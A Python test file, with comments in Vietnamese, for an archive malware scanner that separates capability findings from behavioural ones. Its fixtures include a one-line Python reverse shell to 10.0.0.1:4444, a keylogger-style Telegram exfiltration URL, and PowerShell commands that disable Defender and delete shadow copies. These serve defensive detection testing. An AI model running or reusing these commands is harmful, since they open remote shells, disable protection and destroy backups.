"""Tách severity/confidence: khả năng (API dùng chung) không đủ để gắn cờ; hành vi cần bằng chứng bổ trợ."""
import pytest
from helpers import FAKE_EXE, make_zip, rules_of, scan
from positives import POSITIVES

from archive_guard.rules import RULE_META, Finding

LEVEL = {"clean": 0, "incomplete": 0, "suspicious": 1, "malicious": 2}


@pytest.mark.parametrize("name", sorted(POSITIVES))
def test_synthetic_positives_keep_their_verdict(name):
    minimum, build = POSITIVES[name]
    assert LEVEL[scan(build(), f"{name}.zip").verdict] >= LEVEL[minimum]


@pytest.mark.parametrize("files", [
    {"pynput/_win32.pyd": FAKE_EXE + b"\0SetWindowsHookExW\0GetForegroundWindow\0ToUnicodeEx"},  # thư viện bàn phím
    {"debugger.exe": FAKE_EXE + b"\0VirtualAllocEx\0WriteProcessMemory\0CreateRemoteThread"},   # debugger
    {"Setup.exe": FAKE_EXE + b"\0URLDownloadToFileW\0Software\\Microsoft\\Windows\\CurrentVersion\\Run"},  # bộ cài
])
def test_capability_alone_is_not_flagged(files):
    report = scan(make_zip(files))
    assert report.verdict == "clean"
    assert all(x.confidence == "low" for f in report.files for x in f.findings)


def test_capabilities_in_many_behavior_groups_are_counted():
    # bắt phím + tự khởi động + tải file: 3 nhóm khả năng, không có luật hành vi nào → đáng ngờ, chưa nguy hiểm
    sample = (FAKE_EXE + b"\0SetWindowsHookExA\0GetForegroundWindow\0URLDownloadToFileA\0"
              b"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    report = scan(make_zip({"a.exe": sample}))
    assert report.verdict == "suspicious"
    assert all(x.confidence == "low" for f in report.files for x in f.findings)


def test_capability_plus_exfiltration_is_keylogger_behavior():
    sample = FAKE_EXE + b"\0GetAsyncKeyState\0https://api.telegram.org/bot1/sendMessage"
    report = scan(make_zip({"a.exe": sample}))
    assert "KEYLOG.EXFIL" in rules_of(report) and report.verdict != "clean"


def test_malicious_needs_two_independent_indicators():
    one = scan(make_zip({"a.ps1": b"Set-MpPreference -DisableRealtimeMonitoring $true"}))
    assert one.verdict == "suspicious"  # một luật HIGH đơn lẻ
    two = scan(make_zip({"a.ps1": b"Set-MpPreference -DisableRealtimeMonitoring $true\n"
                                  b"vssadmin delete shadows /all /quiet"}))
    assert two.verdict == "malicious"


@pytest.mark.parametrize("code, hit", [
    (b"import pty\npty.spawn('/bin/bash')", False),  # ví dụ terminal trong thư viện (pip/rich)
    (b"s=socket.socket();s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0);pty.spawn('/bin/sh')", True),
])
def test_reverse_shell_needs_shell_and_network(code, hit):
    assert ("BACKDOOR.REVERSE_SHELL" in rules_of(scan(make_zip({"a.py": code})))) == hit


def test_findings_carry_confidence_and_attack_technique():
    d = Finding("KEYLOG.EXFIL", 3, "keylogger", "x").to_dict()
    assert d["confidence"] == "high" and d["attack"] == "T1056.001"
    assert Finding("YARA.X", 3, "generic", "x").confidence == "medium"
    assert {c for c, _ in RULE_META.values()} == {"low", "medium", "high"}
